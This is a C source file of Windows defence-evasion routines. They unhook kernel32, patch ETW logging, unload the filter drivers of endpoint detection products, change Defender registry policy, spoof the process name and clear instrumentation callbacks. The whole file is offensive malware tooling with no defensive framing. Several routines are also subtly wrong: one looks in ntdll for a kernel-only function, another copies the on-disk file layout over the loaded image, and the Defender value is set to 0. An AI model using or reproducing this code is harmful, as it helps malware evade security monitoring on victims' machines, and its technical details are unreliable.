#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <psapi.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000L
#endif

#ifndef ProcessMitigationPolicy
#define ProcessMitigationPolicy ((PROCESSINFOCLASS)52)
#endif

#pragma comment(lib, "psapi.lib")

typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

unsigned char jocky_unhook_kernel32() {
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (!hKernel32) return 0;

    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), hKernel32, &mi, sizeof(mi))) {
        return 0;
    }

    // Read clean copy from disk
    HANDLE hFile = CreateFile("C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD bytesRead = 0;
    DWORD moduleSize = mi.SizeOfImage;
    unsigned char* clean_module = (unsigned char*)malloc(moduleSize);

    if (!ReadFile(hFile, clean_module, moduleSize, &bytesRead, NULL)) {
        free(clean_module);
        CloseHandle(hFile);
        return 0;
    }
    CloseHandle(hFile);

    // Copy clean module sections over hooked memory
    DWORD oldProtect;
    VirtualProtect(mi.lpBaseOfDll, moduleSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(mi.lpBaseOfDll, clean_module, moduleSize);
    VirtualProtect(mi.lpBaseOfDll, moduleSize, oldProtect, &oldProtect);

    free(clean_module);
    return 1;
}

unsigned char jocky_enable_direct_syscalls() {
    NTSTATUS status = STATUS_SUCCESS;

    // Enable direct syscalls by marking process
    HANDLE hProcess = GetCurrentProcess();
    DWORD dwFlags = 0x00000001; // MitigationPolicyDebuggerAttached

    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationProcess");

    if (NtSetInformationProcess) {
        status = NtSetInformationProcess(hProcess, ProcessMitigationPolicy, &dwFlags, sizeof(dwFlags));
        return SUCCEEDED(status) ? 1 : 0;
    }

    return 0;
}

unsigned char jocky_disable_ob_callbacks() {
    // Hook ObRegisterCallbacks to block EDR callbacks
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (!hNtdll) return 0;

    // Attempt to patch ObRegisterCallbacks by replacing first bytes
    FARPROC pObRegisterCallbacks = GetProcAddress(hNtdll, "ObRegisterCallbacks");
    if (!pObRegisterCallbacks) return 0;

    DWORD oldProtect;
    VirtualProtect(pObRegisterCallbacks, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch with return STATUS_SUCCESS (ret xor eax, eax; ret)
    unsigned char patch[] = {0x33, 0xC0, 0xC3}; // xor eax, eax; ret
    memcpy(pObRegisterCallbacks, patch, sizeof(patch));

    VirtualProtect(pObRegisterCallbacks, 8, oldProtect, &oldProtect);
    return 1;
}

unsigned char jocky_disable_minifilter_callbacks() {
    // Unload MiniFilter drivers
    HMODULE hFltLib = LoadLibrary("fltlib.dll");
    if (!hFltLib) return 0;

    typedef HRESULT (WINAPI *pFilterUnload)(LPCWSTR);
    pFilterUnload FilterUnload = (pFilterUnload)GetProcAddress(hFltLib, "FilterUnload");

    if (FilterUnload) {
        // Try to unload common EDR filters
        FilterUnload(L"WdFilter");
        FilterUnload(L"CbVolumeFilter");
        FilterUnload(L"SentinelMonitor");
    }

    FreeLibrary(hFltLib);
    return 1;
}

unsigned char jocky_disable_wdfilter() {
    // Disable Windows Defender real-time monitoring
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD dwValue = 0;
        RegSetValueEx(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(dwValue));
        RegCloseKey(hKey);
        return 1;
    }
    return 0;
}

unsigned char jocky_patch_etw_provider() {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (!hNtdll) return 0;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return 0;

    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch with return STATUS_SUCCESS
    unsigned char patch[] = {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}; // mov eax, 0; ret
    memcpy(pEtwEventWrite, patch, sizeof(patch));

    VirtualProtect(pEtwEventWrite, 8, oldProtect, &oldProtect);
    return 1;
}

unsigned char jocky_spoof_process_name(const char* new_name) {
    // Modify PEB.ProcessParameters.ImagePathName
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (!peb) return 0;

    UNICODE_STRING* pImagePathName = &peb->ProcessParameters->ImagePathName;
    size_t name_len = strlen(new_name);

    if (name_len > pImagePathName->MaximumLength) return 0;

    mbstowcs((wchar_t*)pImagePathName->Buffer, new_name, name_len);
    pImagePathName->Length = (USHORT)(name_len * sizeof(wchar_t));

    return 1;
}

unsigned char jocky_hide_from_usermode() {
    HANDLE hProcess = GetCurrentProcess();

    // Set ProcessInstrumentationCallbackFilter to block instrumentation
    typedef struct {
        ULONG Reserved1;
        BOOLEAN InstrumentationCallbackEnabled;
        UCHAR Reserved2[3];
    } PROCESS_INSTRUMENTATION_CALLBACK_INFO;

    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationProcess");

    if (NtSetInformationProcess) {
        PROCESS_INSTRUMENTATION_CALLBACK_INFO CallbackInfo = {0, 0, {0}};
        NTSTATUS status = NtSetInformationProcess(hProcess, 50, &CallbackInfo, sizeof(CallbackInfo));
        return SUCCEEDED(status) ? 1 : 0;
    }

    return 0;
}
